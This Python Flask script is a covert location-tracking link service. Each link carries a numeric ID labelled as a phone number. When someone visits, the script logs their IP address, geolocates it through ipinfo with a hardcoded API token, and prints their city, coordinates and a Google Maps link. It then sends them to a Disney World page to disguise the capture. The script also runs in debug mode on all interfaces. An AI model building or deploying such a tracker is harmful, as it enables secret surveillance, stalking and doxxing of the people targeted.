from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)

# Replace with your API token (Sign up at https://ipinfo.io/signup)
api_token = '6d873b9cec6f48'

def get_geolocation(ip_address):
    url = f'https://ipinfo.io/{ip_address}/json?token={api_token}'
    response = requests.get(url)
    data = response.json()
    return data
    
@app.route('/<int:page_id>')
def index(page_id):
    return render_template('index.html', customerId=page_id)

@app.route('/get_geolocation', methods=['GET', 'POST'])
def get_geolocation_route():
    if request.method == 'POST':
        try:
            user_ip_address = request.remote_addr
            #user_ip_address = '193.239.116.197'
            print(user_ip_address)
            geolocation_data = get_geolocation(user_ip_address)
            latitude, longitude = geolocation_data.get('loc').split(',')
            
            print("\nCustomer Identification")
            print("Phone Number {:>1} {}".format(":", request.form.get('customerId')))
            print("IP address {:>3} {}".format(":", user_ip_address))
            print("Country {:>6} {}".format(":", geolocation_data.get('country')))
            print("Region {:>7} {}".format(":", geolocation_data.get('region')))
            print("City {:>9} {}".format(":", geolocation_data.get('city')))
            print("Time Zone {:>4} {}".format(":", geolocation_data.get('timezone')))
            print("latitude {:>5} {}".format(":", latitude))
            print("longitude {:>4} {}".format(":", longitude))
            print("Google Maps {:>2} {}".format(":", "https://www.google.com/maps/place/"+str(latitude)+"+"+str(longitude)))
            print('')
        except Exception as e:
            print("Error Details:", e)
            
    return redirect('https://www.disneyworld.eu/')
    #return render_template('result.html', latitude=latitude, longitude=longitude, customerId=request.form.get('customerId'))

if __name__ == '__main__':
    
    app.run( host='0.0.0.0', port=8080, debug=True)